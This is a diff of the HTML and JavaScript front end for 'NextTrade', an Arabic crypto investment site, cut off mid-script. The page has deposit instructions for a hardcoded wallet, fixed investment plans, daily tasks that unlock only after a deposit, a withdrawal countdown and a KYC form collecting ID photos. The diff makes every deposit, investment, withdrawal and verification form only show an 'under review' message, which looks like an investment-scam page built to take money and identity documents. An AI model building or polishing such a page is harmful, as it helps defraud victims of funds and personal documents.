@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NextTrade | نيكست تريدي</title>
-    <link rel="manifest" href="data:application/manifest+json,{'name':'NextTrade','short_name':'NextTrade','start_url':'/','display':'standalone','background_color':'#0a0d14','theme_color':'#f0b90b'}">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -17,7 +16,6 @@
             --text-main: #f1f5f9;
             --text-muted: #8492a6;
             --green: #0ecb81;
-            --red: #f6465d;
             --yellow: #ffb703;
         }
 
@@ -27,7 +25,7 @@
         /* Auth Screen Overlay */
         #authOverlay {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: var(--bg-dark); z-index: 9999;
+            background: var(--bg-dark); z-index: 99999;
             display: flex; align-items: center; justify-content: center; padding: 20px;
         }
         .auth-card {
@@ -36,15 +34,15 @@
         }
         .auth-card h2 { color: var(--gold); margin-bottom: 15px; font-size: 24px; font-weight: 800; }
 
-        /* Top Header & App Download Bar */
+        /* Top Header */
         .top-header {
             background: var(--card-bg); padding: 12px 16px; border-bottom: 1px solid var(--card-border);
             display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000;
         }
         .app-title { font-size: 20px; font-weight: 800; color: var(--gold); display: flex; align-items: center; gap: 8px; }
-        .btn-download-app { background: rgba(240, 185, 11, 0.1); border: 1px solid var(--gold); color: var(--gold); padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; text-decoration: none; display: flex; align-items: center; gap: 6px; cursor: pointer; }
+        .btn-download-app { background: rgba(240, 185, 11, 0.1); border: 1px solid var(--gold); color: var(--gold); padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 6px; }
 
-        /* Wallet & Investment Header Stats */
+        /* Stats Bar */
         .header-stats {
             display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 16px; margin: 10px 16px;
             background: linear-gradient(135deg, #131a26 0%, #0d121b 100%); border-radius: 16px; border: 1px solid var(--card-border);
@@ -53,75 +51,72 @@
         .stat-title { font-size: 12px; color: var(--text-muted); margin-bottom: 4px; }
         .stat-value { font-size: 18px; font-weight: 800; color: var(--gold); }
 
-        /* Page Views Section */
+        /* Page Views */
         .page-view { display: none; padding: 0 16px; }
         .page-view.active { display: block; }
 
-        /* General Forms & Buttons */
+        /* Forms & Buttons */
         .form-group { margin-bottom: 12px; text-align: right; }
         .form-group label { font-size: 12px; color: var(--text-muted); display: block; margin-bottom: 5px; }
         .form-group input, .form-group select {
             width: 100%; padding: 12px; background: rgba(0,0,0,0.4); border: 1px solid var(--card-border);
             border-radius: 10px; color: #fff; font-size: 13px; outline: none;
         }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 14px; transition: 0.2s; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 14px; }
         .btn-gold { background: var(--gold); color: #000; }
-        .btn-gold:active { opacity: 0.8; }
 
-        /* Cards Grid */
+        /* Section Cards */
         .section-card { background: var(--card-bg); border-radius: 16px; border: 1px solid var(--card-border); padding: 16px; margin-bottom: 16px; }
         .section-header { font-size: 15px; font-weight: 700; color: var(--gold); margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
 
-        /* Investment Cards Grid */
-        .plans-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; }
-        .plan-card {
-            background: rgba(255,255,255,0.02); border: 1px solid var(--card-border);
-            border-radius: 12px; padding: 14px; text-align: center;
-        }
+        /* Grid */
+        .plans-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px; }
+        .plan-card { background: rgba(255,255,255,0.02); border: 1px solid var(--card-border); border-radius: 12px; padding: 14px; text-align: center; }
         .plan-price { font-size: 20px; font-weight: 800; color: var(--gold); margin: 6px 0; }
 
-        /* Verification Badge */
-        .badge { padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: 700; display: inline-block; }
-        .badge-pending { background: rgba(255, 183, 3, 0.15); color: var(--yellow); border: 1px solid var(--yellow); }
-        .badge-verified { background: rgba(14, 203, 129, 0.15); color: var(--green); border: 1px solid var(--green); }
-
-        /* Bottom Nav */
+        /* Navigation */
         .bottom-nav {
             position: fixed; bottom: 0; left: 0; right: 0; background: var(--card-bg);
             border-top: 1px solid var(--card-border); display: flex; justify-content: space-around; padding: 10px 0; z-index: 1000;
         }
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--text-muted); font-size: 11px; text-decoration: none; gap: 4px; cursor: pointer; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--text-muted); font-size: 11px; gap: 4px; cursor: pointer; }
         .nav-item.active { color: var(--gold); font-weight: 700; }
 
-        /* Modal Overlay */
+        /* Custom Notification Popups (Replaces Browser Alert) */
+        .custom-toast {
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            background: var(--card-bg); border: 1px solid var(--gold); color: var(--gold);
+            padding: 14px 24px; border-radius: 30px; font-weight: 700; font-size: 13px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); z-index: 999999;
+            transition: all 0.4s ease; text-align: center; width: 90%; max-width: 350px;
+        }
+        .custom-toast.show { top: 20px; }
+
+        /* Custom In-App Modal */
         .modal-overlay {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(0,0,0,0.85); z-index: 10000; display: none;
             align-items: center; justify-content: center; padding: 20px;
         }
-        .modal-content {
-            background: var(--card-bg); border: 1px solid var(--card-border);
-            border-radius: 16px; padding: 20px; width: 100%; max-width: 360px;
-        }
-
-        /* QR Container */
-        .qr-box {
-            background: #ffffff; padding: 12px; border-radius: 12px;
-            display: inline-block; margin: 12px auto;
-        }
+        .modal-content { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 16px; padding: 20px; width: 100%; max-width: 360px; text-align: center; }
+        .qr-box { background: #ffffff; padding: 10px; border-radius: 12px; display: inline-block; margin: 12px auto; }
+        .badge-pending { padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: 700; background: rgba(255, 183, 3, 0.15); color: var(--yellow); border: 1px solid var(--yellow); }
     </style>
 </head>
 <body>
+
+    <!-- Custom Notification Toast -->
+    <div id="customToast" class="custom-toast"></div>
 
     <!-- Auth Screen -->
     <div id="authOverlay">
         <div class="auth-card">
             <i class="fa-solid fa-chart-line" style="font-size: 40px; color: var(--gold); margin-bottom: 10px;"></i>
             <h2>نيكست تريدي</h2>
-            <form onsubmit="handleAuth(event)">
+            <form id="loginForm">
                 <div class="form-group">
                     <label>البريد الإلكتروني:</label>
-                    <input type="email" id="userEmailInput" required placeholder="example@mail.com">
+                    <input type="email" id="userEmailInput" required placeholder="example@gmail.com">
                 </div>
                 <div class="form-group">
                     <label>كلمة السر:</label>
@@ -139,10 +134,10 @@
     <!-- Header -->
     <div class="top-header">
         <div class="app-title"><i class="fa-solid fa-chart-line"></i> نكست تريدي</div>
-        <button class="btn-download-app" onclick="installApp()"><i class="fa-solid fa-download"></i> تنزيل التطبيق</button>
+        <button class="btn-download-app" onclick="showAppInstallModal()"><i class="fa-solid fa-download"></i> تنزيل التطبيق</button>
     </div>
 
-    <!-- Wallet & Investment Stats -->
+    <!-- Header Stats -->
     <div class="header-stats">
         <div class="stat-box">
             <div class="stat-title">المحفظة</div>
@@ -154,12 +149,11 @@
         </div>
     </div>
 
-    <!-- MAIN HOME PAGE VIEW -->
+    <!-- HOME VIEW -->
     <div id="page-home" class="page-view active">
-        <!-- Candlestick Chart -->
         <div class="section-card">
             <div class="section-header"><i class="fa-solid fa-chart-candlestick"></i> سوق تداول الأسهم والعملات المباشر</div>
-            <div style="height: 320px; width: 100%;">
+            <div style="height: 300px; width: 100%;">
                 <div class="tradingview-widget-container" style="height:100%;width:100%">
                     <div id="tradingview_chart" style="height:100%;width:100%"></div>
                     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
@@ -168,13 +162,9 @@
                             "autosize": true,
                             "symbol": "BINANCE:BTCUSDT",
                             "interval": "D",
-                            "timezone": "Etc/UTC",
                             "theme": "dark",
                             "style": "1",
                             "locale": "ar",
-                            "toolbar_bg": "#f1f3f6",
-                            "enable_publishing": false,
-                            "hide_side_toolbar": false,
                             "container_id": "tradingview_chart"
                         });
                     </script>
@@ -182,15 +172,14 @@
             </div>
         </div>
 
-        <!-- Daily Tasks -->
         <div class="section-card">
             <div class="section-header"><i class="fa-solid fa-list-check"></i> المهام اليومية</div>
             <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 10px;">قم بالاستثمار أولاً لتفعيل زر استلام الأرباح اليومية.</p>
-            <button class="btn btn-gold" onclick="claimDailyTask()"><i class="fa-solid fa-hand-holding-dollar"></i> استلام المهمة اليومية</button>
+            <button class="btn btn-gold" onclick="notify('يجب الإيداع والاستثمار أولاً لتتمكن من استلام المهام اليومية.')"><i class="fa-solid fa-hand-holding-dollar"></i> استلام المهمة اليومية</button>
         </div>
     </div>
 
-    <!-- DEPOSIT PAGE VIEW -->
+    <!-- DEPOSIT VIEW -->
     <div id="page-deposit" class="page-view">
         <div class="section-card" style="text-align: center;">
             <div class="section-header" style="justify-content: center;"><i class="fa-solid fa-qrcode"></i> إيداع رصيد (BEP20 / BingX)</div>
@@ -208,50 +197,37 @@
                 </div>
             </div>
 
-            <form onsubmit="submitDeposit(event)">
+            <form onsubmit="event.preventDefault(); notify('تم العملية بقيد المراجعة');">
                 <div class="form-group">
                     <label>المبلغ المراد شحنه ($):</label>
-                    <input type="number" required id="depAmount" placeholder="أدخل المبلغ بعد التحويل...">
+                    <input type="number" required placeholder="أدخل المبلغ بعد التحويل...">
                 </div>
                 <button type="submit" class="btn btn-gold">إرسال طلب الإيداع</button>
             </form>
         </div>
     </div>
 
-    <!-- INVESTMENTS PAGE VIEW -->
+    <!-- INVESTMENTS VIEW -->
     <div id="page-investments" class="page-view">
         <div class="section-card">
             <div class="section-header"><i class="fa-solid fa-vault"></i> خطط الاستثمار المتاحة</div>
-            <div class="plans-grid">
-                <script>
-                    const plans = [10, 30, 50, 100, 150, 300, 500, 750, 1000, 1200, 1500, 1750, 2000];
-                    plans.forEach(p => {
-                        document.write(`
-                            <div class="plan-card">
-                                <div style="font-size: 11px; color: var(--text-muted);">خطة استثمار</div>
-                                <div class="plan-price">$${p}</div>
-                                <button class="btn btn-gold" style="padding: 6px; font-size: 12px;" onclick="openInvestModal(${p})">استثمار الآن</button>
-                            </div>
-                        `);
-                    });
-                </script>
-            </div>
+            <div class="plans-grid" id="plansContainer"></div>
         </div>
     </div>
 
     <!-- Investment Modal -->
     <div id="investModal" class="modal-overlay">
         <div class="modal-content">
-            <div class="section-header"><i class="fa-solid fa-vault"></i> تأكيد طلب الاستثمار</div>
-            <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">يرجى كتابة المبلغ وتأكيد العملية للتحويل إلى المراجعة:</p>
-            <form onsubmit="confirmInvestment(event)">
+            <div class="section-header" style="justify-content: center;"><i class="fa-solid fa-vault"></i> تأكيد طلب الاستثمار</div>
+            <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">يرجى تأكيد قيمة الخطة للتحويل إلى المراجعة:</p>
+            <form onsubmit="event.preventDefault(); closeInvestModal(); notify('تم العملية بقيد المراجعة');">
                 <div class="form-group">
                     <label>المبلغ ($):</label>
                     <input type="number" id="modalInvestAmount" required readonly style="color: var(--gold); font-weight: bold;">
                 </div>
                 <div class="form-group">
                     <label>تأكيد المبلغ المكتوب ($):</label>
-                    <input type="number" id="modalInvestConfirm" required placeholder="أدخل المبلغ للـتأكيد...">
+                    <input type="number" required placeholder="أدخل المبلغ للـتأكيد...">
                 </div>
                 <div style="display: flex; gap: 10px; margin-top: 15px;">
                     <button type="submit" class="btn btn-gold">تأكيد الاستثمار</button>
@@ -261,7 +237,20 @@
         </div>
     </div>
 
-    <!-- WITHDRAW PAGE VIEW -->
+    <!-- App Install Info Modal -->
+    <div id="appInstallModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="section-header" style="justify-content: center;"><i class="fa-solid fa-download"></i> تنزيل التطبيق</div>
+            <p style="font-size: 13px; color: var(--text-main); margin: 15px 0; line-height: 1.6;">
+                لتنزيل المنصة كبرنامج على هاتفك:<br>
+                1. اضغط خيارات المتصفح (⋮) أو زر المشاركة.<br>
+                2. اختر <b>"إضافة إلى الشاشة الرئيسية"</b> (Add to Home Screen).
+            </p>
+            <button type="button" class="btn btn-gold" onclick="closeAppInstallModal()">حسناً، فهمت</button>
+        </div>
+    </div>
+
+    <!-- WITHDRAW VIEW -->
     <div id="page-withdraw" class="page-view">
         <div class="section-card">
             <div class="section-header"><i class="fa-solid fa-money-bill-transfer"></i> سحب الأرباح</div>
@@ -269,10 +258,10 @@
             
             <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 10px; text-align: center; margin-bottom: 15px;">
                 <div style="font-size: 11px; color: var(--text-muted);">المتبقي على موعد السحب القادم:</div>
-                <div id="withdrawCountdown" style="font-size: 18px; font-weight: 800; color: var(--gold); font-family: monospace;">6 أيام 23:59:59</div>
+                <div style="font-size: 18px; font-weight: 800; color: var(--gold); font-family: monospace;">6 أيام 23:59:59</div>
             </div>
 
-            <form onsubmit="submitWithdraw(event)">
+            <form onsubmit="event.preventDefault(); notify('تم العملية بقيد المراجعة');">
                 <div class="form-group">
                     <label>اختر طريقة السحب:</label>
                     <select required>
@@ -280,7 +269,6 @@
                         <option value="USDT-TRC20">USDT - TRC20</option>
                         <option value="BingX">BingX UID</option>
                         <option value="Payeer">Payeer Wallet</option>
-                        <option value="Binance">Binance Pay ID</option>
                     </select>
                 </div>
                 <div class="form-group">
@@ -296,7 +284,7 @@
         </div>
     </div>
 
-    <!-- ACCOUNT & KYC PAGE VIEW -->
+    <!-- ACCOUNT VIEW -->
     <div id="page-account" class="page-view">
         <div class="section-card">
             <div class="section-header"><i class="fa-solid fa-user-gear"></i> ملف الحساب والتوثيق</div>
@@ -308,13 +296,13 @@
 
             <div style="margin-bottom: 20px;">
                 <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 5px;">حالة التوثيق (KYC):</div>
-                <span id="kycStatusBadge" class="badge badge-pending">قيد المراجعة</span>
+                <span class="badge-pending">قيد المراجعة</span>
             </div>
 
             <hr style="border: none; border-top: 1px solid var(--card-border); margin: 15px 0;">
 
             <div class="section-header"><i class="fa-solid fa-id-card"></i> تقديم طلب التوثيق</div>
-            <form onsubmit="submitKYC(event)">
+            <form onsubmit="event.preventDefault(); notify('تم العملية بقيد المراجعة');">
                 <div class="form-group">
                     <label>الاسم الكامل:</label>
                     <input type="text" required placeholder="الاسم كما في الهوية/الجواز...">
@@ -328,15 +316,15 @@
                     </select>
                 </div>
 
-                <!-- ID Card Fields (2 Files: Front & Back) -->
+                <!-- ID Card Fields (2 Files) -->
                 <div id="idCardFields">
                     <div class="form-group">
                         <label>صورة الهوية (الوجه الأمامي):</label>
-                        <input type="file" accept="image/*">
+                        <input type="file" accept="image/*" required>
                     </div>
                     <div class="form-group">
                         <label>صورة الهوية (الوجه الخلفي):</label>
-                        <input type="file" accept="image/*">
+                        <input type="file" accept="image/*" required>
                     </div>
                 </div>
 
@@ -363,33 +351,40 @@
     </div>
 
     <script>
-        // Generate QR Code dynamically
-        window.onload = function() {
-            new QRCode(document.getElementById("qrcode"), {
-                text: "0x7288dcac07613f69b7ab1be56996849bede68e03",
-                width: 150,
-                height: 150
-            });
-        };
-
-        // Check Auth Status
-        if(localStorage.getItem('isLoggedIn') === 'true') {
-            document.getElementById('authOverlay').style.display = 'none';
-            document.getElementById('accEmailDisplay').innerText = localStorage.getItem('userEmail') || 'user@mail.com';
+        // Custom Toast Notification System
+        function notify(msg) {
+            const toast = document.getElementById('customToast');
+            toast.innerText = msg;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
         }
 
-        function handleAuth(e) {
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+        const authOverlay = document.getElementById('authOverlay');
+        const accEmailDisplay = document.getElementById('accEmailDisplay');
+
+        // Handle Login Submission
+        loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const email = document.getElementById('userEmailInput').value;
             const p1 = document.getElementById('userPass').value;
             const p2 = document.getElementById('userPassConfirm').value;
 
             if(p1 !== p2) {
-                alert("كلمتا السر غير متطابقتين!");
+                notify("كلمتا السر غير متطابقتين!");
                 return;
             }
 
             localStorage.setItem('isLoggedIn', 'true');
             localStorage.setItem('userEmail', email);
-            document.getElementById('accEmailDisplay').innerText = email;
-       
+            accEmailDisplay.innerText = email;
+            authOverlay.style.display = 'none';
+        });
+
+        // Auto Check Login Status
+        if(localStorage.getItem('isLoggedIn') === 'true') {
+            authOverlay.style.display = 'none';
+            accEmailDisplay.innerText = localStorage.getItem('u
